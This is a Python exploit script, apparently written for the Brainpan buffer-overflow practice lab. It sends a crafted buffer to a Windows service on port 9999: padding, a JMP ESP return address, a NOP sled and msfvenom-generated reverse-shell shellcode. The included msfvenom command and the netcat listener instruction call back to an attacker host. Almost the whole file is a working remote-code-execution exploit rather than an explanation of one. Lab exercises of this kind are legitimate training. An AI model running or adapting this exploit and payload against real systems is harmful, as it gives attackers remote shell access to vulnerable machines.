''' get_root.py

This script is the final buffer overflow step, in which we generate shellcode and gain a shell.

First, we generate the shellcode with msfvenom.

Then, we insert a NOP sled into our previous pattern, followed by our shell code, followed by the pointer
to the JMP ESP op code at the EIP. 

This will execute a reverse shell - dont forget to start a listener first! (nc -vlnp 4444)

NOTE: immunity does not have to be running on the victim, only brainpan.exe by itself (run as administrator)

'''

import subprocess, socket, sys


''' generating shell code from within python is messy - just use thee commands at the command line
here is the command that ultimately worked for me:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
NOTE: the payload needs to be written like below, would be interested in figuring out an easier way to represent from msfvenom
'''

host = "192.168.56.103"
port = 9999

# this is the malicious shellcode generated by msfvenom for our target
overflow = b"\xba\xcc\xb0\xb0\x6d\xdd\xc2\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x52\x83\xc7\x04\x31\x57\x0e\x03\x9b\xbe\x52\x98\xdf\x57\x10\x63\x1f\xa8\x75\xed\xfa\x99\xb5\x89\x8f\x8a\x05\xd9\xdd\x26\xed\x8f\xf5\xbd\x83\x07\xfa\x76\x29\x7e\x35\x86\x02\x42\x54\x04\x59\x97\xb6\x35\x92\xea\xb7\x72\xcf\x07\xe5\x2b\x9b\xba\x19\x5f\xd1\x06\x92\x13\xf7\x0e\x47\xe3\xf6\x3f\xd6\x7f\xa1\x9f\xd9\xac\xd9\xa9\xc1\xb1\xe4\x60\x7a\x01\x92\x72\xaa\x5b\x5b\xd8\x93\x53\xae\x20\xd4\x54\x51\x57\x2c\xa7\xec\x60\xeb\xd5\x2a\xe4\xef\x7e\xb8\x5e\xcb\x7f\x6d\x38\x98\x8c\xda\x4e\xc6\x90\xdd\x83\x7d\xac\x56\x22\x51\x24\x2c\x01\x75\x6c\xf6\x28\x2c\xc8\x59\x54\x2e\xb3\x06\xf0\x25\x5e\x52\x89\x64\x37\x97\xa0\x96\xc7\xbf\xb3\xe5\xf5\x60\x68\x61\xb6\xe9\xb6\x76\xb9\xc3\x0f\xe8\x44\xec\x6f\x21\x83\xb8\x3f\x59\x22\xc1\xab\x99\xcb\x14\x7b\xc9\x63\xc7\x3c\xb9\xc3\xb7\xd4\xd3\xcb\xe8\xc5\xdc\x01\x81\x6c\x27\xc2\x6e\xd8\x1f\x77\x07\x1b\x5f\x66\x8b\x92\xb9\xe2\x23\xf3\x12\x9b\xda\x5e\xe8\x3a\x22\x75\x95\x7d\xa8\x7a\x6a\x33\x59\xf6\x78\xa4\xa9\x4d\x22\x63\xb5\x7b\x4a\xef\x24\xe0\x8a\x66\x55\xbf\xdd\x2f\xab\xb6\x8b\xdd\x92\x60\xa9\x1f\x42\x4a\x69\xc4\xb7\x55\x70\x89\x8c\x71\x62\x57\x0c\x3e\xd6\x07\x5b\xe8\x80\xe1\x35\x5a\x7a\xb8\xea\x34\xea\x3d\xc1\x86\x6c\x42\x0c\x71\x90\xf3\xf9\xc4\xaf\x3c\x6e\xc1\xc8\x20\x0e\x2e\x03\xe1\x2e\xcd\x81\x1c\xc7\x48\x40\x9d\x8a\x6a\xbf\xe2\xb2\xe8\x35\x9b\x40\xf0\x3c\x9e\x0d\xb6\xad\xd2\x1e\x53\xd1\x41\x1e\x76"

# user input - data from last step in the bof process
offset = int(input("> Input the exact offset (from find_offset.py): ")) 
jmp = b'\xf3\x12\x17\x31' 
sled = b'\x90'*128  # may have to adjust the number of NOPs to get it to work correctly

shellcode = b"A"*offset + jmp + sled + overflow 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # connect 
    s.connect((host, port))
    s.recv(1024)
    # send pattern to target
    s.sendall(shellcode)
    print("Sent")
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
